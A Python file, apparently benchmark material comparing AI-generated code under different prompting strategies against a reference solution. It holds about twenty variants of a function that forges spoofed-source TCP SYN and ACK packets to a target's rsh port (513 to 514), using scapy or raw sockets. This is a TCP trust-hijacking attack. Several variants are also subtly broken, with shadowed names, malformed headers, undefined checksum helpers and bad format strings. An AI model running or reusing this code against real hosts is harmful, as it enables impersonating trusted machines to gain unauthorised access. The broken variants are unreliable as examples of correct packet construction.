from scapy.all import *
import socket
import struct
import random
from ctypes import *


def is_valid_ip(ip):
    try:
        socket.inet_aton(ip)
        return True
    except socket.error:
        return False


def ground_truth_code_spoofConn(src, tgt, ack):
    IPlayer = IP(src=src, dst=tgt)
    TCPlayer = TCP(sport=513, dport=514)
    synPkt = IPlayer / TCPlayer
    send(synPkt)

    IPlayer = IP(src=src, dst=tgt)
    TCPlayer = TCP(sport=513, dport=514, ack=ack)
    ackPkt = IPlayer / TCPlayer
    send(ackPkt)


def persona_spoofConn(src, tgt, ack):
    import scapy.all as sp
    spacket = sp.IP(src=src, dst=tgt) / sp.TCP(sport=513, dport=514, flags='S')
    send(spacket)
    ackpacket = sp.IP(src=src, dst=tgt) / sp.TCP(sport=513, dport=514, flags='A', ack=ack + 1)
    send(ackpacket)


def template_spoofConn(src, tgt, ack):
    import socket
    import struct
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
        s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        ip_header = struct.pack('!BBHHHBBH4s4s', 69, 0, 40, 0, 64, 6, 0, 0, socket.inet_aton(src), socket.inet_aton(tgt))
        tcp_header = struct.pack('!HHLLBBHHH', 513, 514, 0, ack, 5 << 4, 2, 0, 9872, 0)
        packet = ip_header + tcp_header
        s.sendto(packet, (tgt, 0))
    except Exception as e:
        s.close()


def question_refinement_spoofConn(src, tgt, ack):
    if not src.replace('.', '', 3).isdigit() or not tgt.replace('.', '', 3).isdigit():
        return False
    if len(src.split('.')) != 4 or len(tgt.split('.')) != 4:
        return False
    if not str(ack).isdigit():
        return False
    try:
        socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
        socket.setsockopt(socket.SOL_IP, socket.IP_HDRINCL, 1)
        src_parts = list(map(int, src.split('.')))
        tgt_parts = list(map(int, tgt.split('.')))
        ip_header = b''
        ip_ihl = 5
        ip_ver = 4
        ip_tos = 0
        ip_tot_len = 40
        ip_id = 54321
        ip_frag_off = 0
        ip_ttl = 255
        ip_proto = socket.IPPROTO_TCP
        ip_check = 0
        ip_saddr = struct.pack('!BBBB', src_parts[0], src_parts[1], src_parts[2], src_parts[3])
        ip_daddr = struct.pack('!BBBB', tgt_parts[0], tgt_parts[1], tgt_parts[2], tgt_parts[3])
        ip_ihl_ver = (ip_ver << 4) + ip_ihl
        ip_header += struct.pack('!BBHHHBBH', ip_ihl_ver, ip_tos, ip_tot_len, ip_id, ip_frag_off, ip_ttl, ip_proto, ip_check)
        ip_header += ip_saddr + ip_daddr
        tcp_source = 513
        tcp_dest = 514
        tcp_seq = 0
        tcp_ack_seq = int(ack)
        tcp_doff = 5
        tcp_fin = 0
        tcp_syn = 1
        tcp_rst = 0
        tcp_psh = 0
        tcp_ack = 1
        tcp_urg = 0
        tcp_window = socket.htons(5840)
        tcp_check = 0
        tcp_urg_ptr = 0
        tcp_offset_res = (tcp_doff << 4) + 0
        tcp_flags = tcp_fin + (tcp_syn << 1) + (tcp_rst << 2) + (tcp_psh << 3) + (tcp_ack << 4) + (tcp_urg << 5)
        tcp_header = struct.pack('!HHLLBBHHH', tcp_source, tcp_dest, tcp_seq, tcp_ack_seq, tcp_offset_res, tcp_flags, tcp_window, tcp_check, tcp_urg_ptr)
        source_address = socket.inet_aton(src)
        dest_address = socket.inet_aton(tgt)
        placeholder = 0
        protocol = socket.IPPROTO_TCP
        tcp_length = len(tcp_header)
        pseudo_header = struct.pack('!4s4sBBH', source_address, dest_address, placeholder, protocol, tcp_length)
        psh = pseudo_header + tcp_header
        tcp_check = csum(psh)
        tcp_header = struct.pack('!HHLLBBH', tcp_source, tcp_dest, tcp_seq, tcp_ack_seq, tcp_offset_res, tcp_flags, tcp_window) + struct.pack('H', tcp_check) + struct.pack('!H', tcp_urg_ptr)
        packet = ip_header + tcp_header
        socket.sendto(packet, (tgt, 0))
    except Exception as e:
        return False


def alternative_approaches_spoofConn(src, tgt, ack):
    import socket
    import struct
    

    class IP(Structure):
        _fields_ = [
            ('ihl', c_uint8, 4),
            ('version', c_uint8, 4),
            ('tos', c_uint8),
            ('len', c_uint16),
            ('id', c_uint16),
            ('offset', c_uint16),
            ('ttl', c_uint8),
            ('protocol', c_uint8),
            ('sum', c_uint16),
            ('src', c_uint32),
            ('dst', c_uint32)
        ]

    class TCP(Structure):
        _fields_ = [
            ('src_port', c_uint16),
            ('dest_port', c_uint16),
            ('seq', c_uint32),
            ('ack_seq', c_uint32),
            ('reserved_part1', c_uint8, 4),
            ('tcp_flags', c_uint8, 4),
            ('window', c_uint16),
            ('check', c_uint16),
            ('urg_ptr', c_uint16)
        ]

    def checksum(msg):
        s = 0
        for i in range(0, len(msg), 2):
            if i + 1 < len(msg):
                w = msg[i] + (msg[i + 1] << 8)
            else:
                w = msg[i]
            s = s + w
        s = (s >> 16) + (s & 0xffff)
        s = ~s & 0xffff
        return s

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
        s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        packet = ''
        ip_header = IP(
            version=4,
            ihl=5,
            tos=0,
            len=20 + 20,
            id=socket.htons(54321),
            offset=0,
            ttl=53,
            protocol=socket.IPPROTO_TCP,
            sum=0,
            src=socket.inet_aton(src),
            dst=socket.inet_aton(tgt)
        )
        ip_checksum = checksum(str(bytes(ip_header))[:20])
        ip_header.sum = ip_checksum
        ip_byte_array = bytes(ip_header)
        tcp_header = TCP(
            src_port=socket.htons(513),
            dest_port=socket.htons(514),
            seq=0,
            ack_seq=ack,
            reserved_part1=0,
            tcp_flags=0x12 if ack == 0 else 0x18,
            window=socket.htons(8192),
            check=0,
            urg_ptr=0
        )
        tcp_pseudo_header = struct.pack('!4s4sBBH', ip_header.src, ip_header.dst, 0, ip_header.protocol, len(tcp_header))
        tcp_checksum = checksum(tcp_pseudo_header + bytes(tcp_header))
        tcp_header.check = tcp_checksum
        tcp_byte_array = bytes(tcp_header)
        packet = ip_byte_array + tcp_byte_array
        s.sendto(packet, (tgt, 0))
    except Exception as e:
        print(f"An error occurred: {e}")


def context_manager_spoofConn(src, tgt, ack):
    import socket
    import struct
    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    ip_header = struct.pack('!BBHHHBBH4s4s', 69, 0, 40, 0, 64, 6, 0, 0, socket.inet_aton(src), socket.inet_aton(tgt))
    tcp_syn_header = struct.pack('!HHLLBBHHH', 513, 514, 0, 2, 0x12, 64, 0, 0, 0)
    tcp_ack_header = struct.pack('!HHLLBBHHH', 513, 514, ack, 34, 0x10, 64, 0, 0, 0)
    packet = ip_header + tcp_syn_header
    s.sendto(packet, (tgt, 0))
    packet = ip_header + tcp_ack_header
    s.sendto(packet, (tgt, 0))


def flipped_interaction_3_spoofConn(src, tgt, ack):
    try:
        syn_packet = IP(src=src, dst=tgt) / TCP(sport=513, dport=514, flags='S')
        send(syn_packet, verbose=0)
        ack_packet = IP(src=src, dst=tgt) / TCP(sport=513, dport=514, flags='A', seq=ack + 1, ack=syn_packet[TCP].seq + 1)
        send(ack_packet, verbose=0)
        print(f'Sent SYN and ACK packets to {tgt} from {src}')
    except Exception as e:
        print(f'An error occurred: {e}')


def flipped_interaction_4_spoofConn(src, tgt, ack):
    ip_layer = IP(src=src, dst=tgt)
    syn_tcp_layer = TCP(sport=513, dport=514, flags='S', seq=ack)
    syn_packet = ip_layer / syn_tcp_layer
    send(syn_packet)
    print(f'Sent SYN packet from {src}:513 to {tgt}:514 with seq={ack}')
    ack_tcp_layer = TCP(sport=513, dport=514, flags='A', seq=ack + 1, ack=ack + 1)
    ack_packet = ip_layer / ack_tcp_layer
    send(ack_packet)
    print(f'Sent ACK packet from {src}:513 to {tgt}:514 with seq={ack+1} and ack={ack+1}')


def flipped_interaction_5_spoofConn(src, tgt, ack):
    try:
        syn_packet = IP(src=src, dst=tgt) / TCP(sport=513, dport=514, flags='S')
        logging.info(f"Sending SYN packet from {src}:{513} to {tgt}:{514}")
        send(syn_packet)
        print(f"SYN packet sent successfully from {src}:{513} to {tgt}:{514}")
        ack_packet = IP(src=src, dst=tgt) / TCP(sport=513, dport=514, seq=ack + 1, ack=0, flags='A')
        logging.info(f"Sending ACK packet from {src}:{513} to {tgt}:{514} with seq={ack + 1}")
        send(ack_packet)
        print(f"ACK packet sent successfully from {src}:{513} to {tgt}:{514}")
    except Exception as e:
        logging.error(f"An error occurred: {e}")
        print(f"Failed to send packets. Error: {e}")


def iterative_prompting_3_spoofConn(src, tgt, ack):
    import socket
    import struct
    import ipaddress
    try:
        ipaddress.ip_address(src)
        ipaddress.ip_address(tgt)
    except ValueError:
        return False
    if not isinstance(ack, int) or ack < 0:
        return False
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
        s.setsockopt(socket.SOL_IP, socket.IP_HDRINCL, 1)
        ip_header = b"\xE4\x00\x00\x28\x00\x00\x40\x00\x40\x06\x00\x00\xC0\xA8\x01\x0A\xC0\xA8\x01\x0B"
        tcp_header = struct.pack("!HHLLBBHHH", 513, 514, 0, ack, 5 << 4, 0, socket.htons(51840), 0)
        packet = ip_header + tcp_header
        s.sendto(packet, (tgt, 0))
    except socket.error as e:
        return False
    finally:
        s.close()
    return True


def iterative_prompting_4_spoofConn(src, tgt, ack):
    import socket
    import struct
    import re
    ip_pattern = r'^\d{{1,3}}(\.\d{{1,3}}){{3}}$'
    if not re.match(ip_pattern, src) or not re.match(ip_pattern, tgt):
        raise ValueError('Invalid IP address format')
    if not all(0 <= int(octet) <= 255 for octet in src.split('.')) or not all(0 <= int(octet) <= 255 for octet in tgt.split('.')):
        raise ValueError('IP address values out of range')
    if not isinstance(ack, int) or ack < 0:
        raise ValueError('Invalid acknowledgment number')
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
        s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    except socket.error as e:
        raise RuntimeError(f'Socket creation failed: {str(e)}')
    source_port = 513
    dest_port = 514
    sequence_number = 0
    acknowledgment_number = ack
    header_length = 8
    syn_data = b'\x50\x02\x71\x10\x00\x00\x00\x00'
    checksum = 0
    urgent_pointer = 0
    offset_reserved = (header_length << 4) + 0
    tcp_flags = 0x02
    tcp_header = struct.pack('!HHLLBBHHH', source_port, dest_port, sequence_number, acknowledgment_number, offset_reserved, tcp_flags, 29200, checksum, urgent_pointer)
    pseudo_header = struct.pack('!4s4sBBH', socket.inet_aton(src), socket.inet_aton(tgt), 0, socket.IPPROTO_TCP, header_length * 4 + len(tcp_header))
    raw_packet = pseudo_header + tcp_header
    checksum = calculate_checksum(raw_packet)
    tcp_header = struct.pack('!HHLLBBHHH', source_port, dest_port, sequence_number, acknowledgment_number, offset_reserved, tcp_flags, 29200, checksum, urgent_pointer)
    send_packet = pseudo_header[4:] + tcp_header
    ack_data = b'\x50\x10\x71\x10\x00\x00\x00\x00'
    tcp_flags = 0x10
    tcp_header_ack = struct.pack('!HHLLBBHHH', source_port, dest_port, sequence_number + 1, acknowledgment_number, offset_reserved, tcp_flags, 29200, checksum, urgent_pointer)
    raw_packet_ack = pseudo_header + tcp_header_ack
    checksum_ack = calculate_checksum(raw_packet_ack)
    tcp_header_ack = struct.pack('!HHLLBBHHH', source_port, dest_port, sequence_number + 1, acknowledgment_number, offset_reserved, tcp_flags, 29200, checksum_ack, urgent_pointer)
    send_packet_ack = pseudo_header[4:] + tcp_header_ack
    try:
        s.sendto(send_packet, (tgt, 0))
        s.sendto(send_packet_ack, (tgt, 0))
    except socket.error as e:
        raise RuntimeError(f'Failed to send packet: {str(e)}')
    finally:
        s.close()


def iterative_prompting_5_spoofConn(src, tgt, ack):
    import socket
    import struct
    from ipaddress import IPv4Address, AddressValueError
    try:
        src_ip = str(IPv4Address(src))
        tgt_ip = str(IPv4Address(tgt))
    except AddressValueError:
        raise ValueError('Invalid IP address')
    ip_header = b"\x45\x00\x00\x28\xab\xcd\x00\x00\x40\x06\x00\x00\x00\x00\x00\x00\xc0\xa8\x01\x02\xc0\xa8\x01\x03"
    ip_checksum = create_checksum(ip_header)
    ip_header = ip_header[:10] + struct.pack("!H", ip_checksum) + ip_header[12:]
    tcp_header = b"\x02\x01\x02\x02\x00\x00\x00\x00\x50\x1f\x00\x00\x00\x00\x00\x00\x00\x00"

    if ack:
        tcp_header = tcp_header[:13] + b"\x10\x00" + tcp_header[15:]
    else:
        tcp_header = tcp_header[:13] + b"\x02\x00" + tcp_header[15:]
    tcp_checksum = create_checksum(tcp_header + struct.pack('!4s4sHH', socket.inet_aton(src_ip), socket.inet_aton(tgt_ip), 0, len(tcp_header)))
    tcp_header = tcp_header[:16] + struct.pack('\x3eH', tcp_checksum) + tcp_header[18:]
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
        s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        s.sendto(ip_header + tcp_header, (tgt_ip, 0))
    except socket.error as e:
        raise RuntimeError(f'Socket error: {str(e)}')
    finally:
        s.close()


def few_shots_prompting_spoofConn(src, tgt, ack):
    pkt = IP(src=src, dst=tgt) / TCP(sport=513, dport=514, flags='S')
    send(pkt)
    pkt = IP(src=src, dst=tgt) / TCP(sport=513, dport=514, flags='A', ack=ack + 1)
    send(pkt)


def cot_prompting_spoofConn(src, tgt, ack):
    pkt = IP(src=src, dst=tgt) / TCP(sport=513, dport=514, flags='S')
    send(pkt)
    syn_ack_pkt = IP(src=src, dst=tgt) / TCP(sport=513, dport=514, flags='SA', ack=ack + 1)
    send(syn_ack_pkt)


def fact_check_list_spoofConn(src, tgt, ack):
    ip_header = IP(src=src, dst=tgt)
    syn_packet = ip_header / TCP(sport=513, dport=514, flags='S', seq=1000)
    send(syn_packet)
    ack_packet = ip_header / TCP(sport=513, dport=514, flags='A', seq=syn_packet.seq + 1, ack=ack + 1)
    send(ack_packet)


def not_interactive_mix_spoofConn(src, tgt, ack):
    if not is_valid_ip(src) or not is_valid_ip(tgt):
        raise ValueError("Invalid IPv4 address(es) provided.")
    if not isinstance(ack, int) or ack < 0 or ack > 2**32 - 1:
        raise ValueError("Acknowledgment number must be a valid non-negative integer within the range 0 to 2^32-1.")
    sport = 513
    dport = 514
    try:
        syn_packet = IP(src=src, dst=tgt) / TCP(sport=sport, dport=dport, flags='S', seq=1000)
        send(syn_packet)
        ack_packet = IP(src=src, dst=tgt) / TCP(sport=sport, dport=dport, flags='A', seq=1001, ack=ack + 1)
        send(ack_packet)
    except Exception as e:
        raise RuntimeError(f"An error occurred while sending the packets: {e}")


def interactive_mix_spoofConn(src, tgt, ack):
    try:
        socket.inet_pton(socket.AF_INET, src)
    except socket.error:
        try:
            socket.inet_pton(socket.AF_INET6, src)
        except socket.error:
            raise ValueError("src must be a valid IPv4 or IPv6 address.")
    try:
        socket.inet_pton(socket.AF_INET, tgt)
    except socket.error:
        try:
            socket.inet_pton(socket.AF_INET6, tgt)
        except socket.error:
            raise ValueError("tgt must be a valid IPv4 or IPv6 address.")
    if not isinstance(ack, int) or ack < 0 or ack > 4294967295:
        raise ValueError("ack must be a non-negative integer within the range 0 to 4294967295.")
    synPkt = IP(src=src, dst=tgt) / TCP(sport=513, dport=514, flags='S', seq=RandShort())
    ackPkt = IP(src=src, dst=tgt) / TCP(sport=513, dport=514, flags='A', seq=ack + 1, ack=ack)
    try:
        send(synPkt, verbose=0)
        send(ackPkt, verbose=0)
    except Exception as e:
        raise RuntimeError(f"An error occurred while sending packets: {e}")


def baseline_spoofConn(src, tgt, ack):
    syn = IP(src=src, dst=tgt) / TCP(sport=513, dport=514, flags='S')
    send(syn)
    ack_pkt = IP(src=src, dst=tgt) / TCP(sport=513, dport=514, flags='A', seq=ack)
    send(ack_pkt)

